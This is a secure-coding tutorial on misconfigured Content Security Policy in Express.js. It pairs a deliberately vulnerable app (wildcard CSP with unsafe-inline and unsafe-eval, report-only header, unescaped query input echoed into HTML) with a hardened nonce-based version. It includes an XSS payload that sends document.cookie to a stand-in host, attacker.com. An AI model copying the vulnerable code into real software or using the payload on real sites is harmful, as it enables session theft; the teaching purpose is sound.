Content Security Policy (CSP) is a critical defense against XSS attacks, but a misconfigured CSP can be completely ineffective or even provide a false sense of security. Let me show you the dangerous patterns to avoid.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const app = express();

// DANGEROUS: Overly permissive CSP that provides no real protection
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src *; connect-src *; frame-src *;"
  );
  next();
});

// Another dangerous pattern: CSP with report-only and no enforcement
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy-Report-Only',
    "default-src 'self'"
  );
  // No actual CSP header set - only reporting!
  next();
});

app.get('/profile', (req, res) => {
  const username = req.query.name;
  // XSS vulnerability - CSP should block this but doesn't
  res.send(`<html><body><h1>Welcome ${username}</h1></body></html>`);
});

app.listen(3000);
```

**Attack Payload**:
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

With the permissive CSP above, visiting:
```text
/profile?name=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

**Why This Is Dangerous**:
- `'unsafe-inline'` allows inline `<script>` tags, completely defeating XSS protection
- `'unsafe-eval'` allows `eval()`, `Function()`, and `setTimeout('string')` - common XSS vectors
- `script-src *` allows loading scripts from ANY domain including attacker-controlled sites
- `default-src *` is essentially no policy at all
- Using only `Report-Only` header means attacks succeed while you just log them

**SECURE VERSION**:

```javascript
const express = require('express');
const crypto = require('crypto');
const helmet = require('helmet');

const app = express();

// Generate nonce for each request
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

// SECURE: Strict CSP with nonce-based script execution
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        (req, res) => `'nonce-${res.locals.nonce}'`
      ],
      styleSrc: ["'self'", "https://fonts.googleapis.com"],
      imgSrc: ["'self'", "https://cdn.example.com", "data:"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      connectSrc: ["'self'", "https://api.example.com"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: [],
      blockAllMixedContent: []
    },
    reportOnly: false
  })
);

app.get('/profile', (req, res) => {
  // Properly escape user input
  const username = escapeHtml(req.query.name || 'Guest');
  res.send(`
    <html>
    <body>
      <h1>Welcome ${username}</h1>
      <script nonce="${res.locals.nonce}">
        console.log('Legitimate script with nonce');
      </script>
    </body>
    </html>
  `);
});

function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

app.listen(3000);
```

**Key Security Controls**:
- **Nonce-based scripts**: Only scripts with the correct per-request nonce can execute, blocking injected scripts
- **No unsafe-inline/unsafe-eval**: Removes the most common CSP bypasses
- **Explicit allowlists**: Only trusted domains can serve resources
- **object-src 'none'**: Blocks Flash/Java plugins commonly used in attacks
- **frame-ancestors 'none'**: Prevents clickjacking attacks
- **base-uri 'self'**: Prevents base tag injection attacks

